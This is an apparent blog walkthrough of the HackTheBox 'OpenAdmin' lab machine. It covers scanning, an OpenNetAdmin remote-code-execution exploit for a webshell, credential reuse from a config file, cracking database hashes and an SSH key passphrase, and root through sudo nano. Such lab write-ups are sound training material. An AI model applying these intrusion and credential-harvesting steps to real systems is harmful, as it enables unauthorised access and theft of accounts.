---
title: HTB | OpenAdmin
author: Zeropio
date: 2022-12-25
categories: [Pentesting, HackTheBox]
tags: [htb, linux, easy, machines]
permalink: /pentesting/htb/machines/openadmin
image:
  path: /assets/img/hackthebox/card/OpenAdmin.png
  width: 800
  height: 500
---

# Fingerprint

## Scan

The scan show:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b98df85d17ef03dda48cdbc9200b754 (RSA)
|   256 dceb3dc944d118b122b4cfdebd6c7a54 (ECDSA)
|_  256 dcadca3c11315b6fe6a489347c9be550 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

The page has a default Apache. Fuzzing will show:

```
music                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 44ms]
artwork                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 43ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 43ms]
                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 49ms]
sierra                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 43ms]
                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 82ms]
                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 44ms]
```

But on each of the pages there are a different web.

```console
$ whatweb http://10.10.10.171/music/
	http://10.10.10.171/music/ [200 OK] Apache[2.4.29], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.171], JQuery[3.2.1], Script, Title[Music | NOT LIVE/NOT FOR PRODUCTION USE]
$ whatweb http://10.10.10.171/artwork/
	http://10.10.10.171/artwork/ [200 OK] Apache[2.4.29], Bootstrap, Country[RESERVED][ZZ], Email[hello@mydomain.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.171], JQuery[3.3.1], Script, Title[Arcwork &mdash; Website Template by Colorlib]
$ whatweb http://10.10.10.171/sierra/ 
	http://10.10.10.171/sierra/ [200 OK] Apache[2.4.29], Bootstrap, Country[RESERVED][ZZ], Email[contact@template.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.171], JQuery[3.2.1], Script, Title[Sierra], X-UA-Compatible[IE=edge]
```

There aren’t much vulnerabilities for this jQuery version (`searchsploit jquery`). But for Apache:

```console
$ searchsploit apache 2.4.49

. . . <SNIP> . . .
Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)                                                   | multiple/webapps/50383.sh
```

### Music

We can found different pages that display songs, playlist… but two of them pretty different. In one of them we have a contact form and the other have an **OpenNetAdmin** running. If we intercept the request we can see an **ONA cookie**:

```html
GET /music/contact.html? HTTP/1.1
Host: 10.10.10.171
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://10.10.10.171/music/contact.html
Cookie: ONA_SESSION_ID=0la207702703doitfhb5d1rdb1
Upgrade-Insecure-Requests: 1
```

The ONA version can be seen in the page:

![Untitled](/assets/img/hackthebox/labs/openadmin/Untitled.png)

Searching for it:

```console
$ searchsploit 18.1.1                      
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                                                               | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                                                                                | php/webapps/47691.sh
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

---

# Footprint

## Initial Access

Using that exploit grants us a direct webshell:

```console
$ bash 47691.sh http://10.10.10.171/ona/
$ whoami
	www-data
```

## User Escalation

There are two users under `/home`{: .filepath}:

```console
$ ls /home
jimmy
joanna
```

Searching in the system with the webshell we found the following:

```console
$ cat local/config/database_settings.inc.php
```

```php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

We can try this credentials for both users:

```console
$ ssh jimmy@10.10.10.171
jimmy@openadmin:~$
```

Finally, we have the credentials for `jimmy:n1nj4W4rri0R!`. This user doesn’t have sudo permission:

```console
jimmy@openadmin:~$ sudo -l
[sudo] password for jimmy: 
Sorry, user jimmy may not run sudo on openadmin.
```

We can see **AppArmor** running on the system:

```console
jimmy@openadmin:~$  find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
/proc
/sys/kernel/security/apparmor/.remove
/sys/kernel/security/apparmor/.replace
/sys/kernel/security/apparmor/.load
/sys/kernel/security/apparmor/.access
```

We can use the previous credentials to access the MySQL database:

```console
jimmy@openadmin:~$ mysql -u ona_sys -p
Enter password:

mysql>
```

We found there some credentials:

```console
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| ona_default        |
+--------------------+
2 rows in set (0.00 sec)

mysql> use ona_default;
mysql> show tables;
+------------------------+
| Tables_in_ona_default  |
+------------------------+
| blocks                 |
| configuration_types    |
. . . <SNIP> . . . 
| users                  |
| vlan_campuses          |
| vlans                  |
+------------------------+
40 rows in set (0.00 sec)

mysql> select * from users;
+----+----------+----------------------------------+-------+---------------------+---------------------+
| id | username | password                         | level | ctime               | atime               |
+----+----------+----------------------------------+-------+---------------------+---------------------+
|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2022-12-25 19:08:24 | 2022-12-25 19:08:24 |
|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2007-10-30 03:00:17 | 2007-12-02 22:10:26 |
+----+----------+----------------------------------+-------+---------------------+---------------------+
```

We can crack the hashes and get: `guest:test` and `admin:admin`. We can now login in ONA as admin.

Jimmy can access a folder, `/var/www/internal`{: .filepath}. There we have three files. In the **index.php** we can found the following hash:

```php
<?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>
```

Cracking this sha512 show the password **Revealed**. The **main.php** file show an RSA file:

```php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

This web cannot be accesed outside the machine. We can start an PHP server, but once we access the page with the credentials `jimmy:Revealed` it is blank:

```console
jimmy@openadmin:/var/www/internal$ php -S 10.10.10.171:10000
```

![Untitled](/assets/img/hackthebox/labs/openadmin/Untitled%201.png)

In the log we can see the following line:

```
[Sun Dec 25 19:19:26 2022] 10.10.14.4:45688 [200]: /
[Sun Dec 25 19:19:26 2022] 10.10.14.4:45702 [404]: /css/bootstrap.min.css - No such file or directory
[Sun Dec 25 19:19:33 2022] 10.10.14.4:42726 [302]: /index.php
cat: /home/joanna/.ssh/id_rsa: Permission denied
```

User **jimmy** doesn’t have access to the user **joanna**. Checking for open ports we found this:

```console
jimmy@openadmin:/var/www/internal$ nc -z -v 127.0.0.1 1-65535 2>&1 | grep -v 'Connection refused'
Connection to 127.0.0.1 22 port [tcp/ssh] succeeded!
Connection to 127.0.0.1 80 port [tcp/http] succeeded!
Connection to 127.0.0.1 3306 port [tcp/mysql] succeeded!
Connection to 127.0.0.1 9000 port [tcp/*] succeeded!
Connection to 127.0.0.1 52846 port [tcp/*] succeeded!
```

We can now bind that port to our machine:

```console
$ ssh -L 80:127.0.0.1:52846 jimmy@10.10.10.171
```

And login in, now we can see the page:

![Untitled](/assets/img/hackthebox/labs/openadmin/Untitled%202.png)

We try logging as **joanna**, but we need a passprhase:

```console
$ ssh -i id_rsa joanna@10.10.10.171                          
Enter passphrase for key 'id_rsa':
```

Trying `ninja` doesn’t work, so we need to crack the RSA:

```console
$ ssh2john id_rsa > hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
. . . <SNIP> . . . 
bloodninjas      (id_rsa)
```

And now we can access as **joanna**.

## Root Escalation

We can see we have access to `nano`:

```console
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

Following the [GTFObins](https://gtfobins.github.io/gtfobins/nano/#sudo) we have a quickly escalate:

```console
$ sudo /bin/nano /opt/priv
. . . <SNIP> . . .
# whoami
root
```
